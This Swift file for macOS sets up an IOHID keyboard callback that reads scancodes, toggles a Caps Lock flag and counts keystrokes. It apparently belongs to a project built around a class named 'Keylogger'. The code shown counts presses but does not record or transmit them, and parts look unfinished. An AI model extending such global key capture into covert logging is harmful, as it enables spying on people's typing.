import Foundation
import Cocoa

// keeps track of keystoke count
var count: Int = 0

class CallBackFunctions
{
    static var CAPSLOCK = false
    static var calander = Calendar.current
    static var prev = ""
    
     
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback  = { context, result, sender, device in
        
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let elem: IOHIDElement = IOHIDValueGetElement(device );
        var test: Bool
        
        if (IOHIDElementGetUsagePage(elem) != 0x07)
        {
            return
        }
        let scancode = IOHIDElementGetUsage(elem);
        if (scancode < 4 || scancode > 231)
        {
            return
        }
        let pressed = IOHIDValueGetIntegerValue(device );

Outside:if pressed == 1
        {
            if scancode == 57
            {
                CallBackFunctions.CAPSLOCK = !CallBackFunctions.CAPSLOCK
                count+=1
                break Outside
            }
            if scancode >= 224 && scancode <= 231
            {
                count+=1
                break Outside
            }
            if CallBackFunctions.CAPSLOCK
            {
                count+=1
            }
            else
            {
                count+=1
            }
        }
    }
}
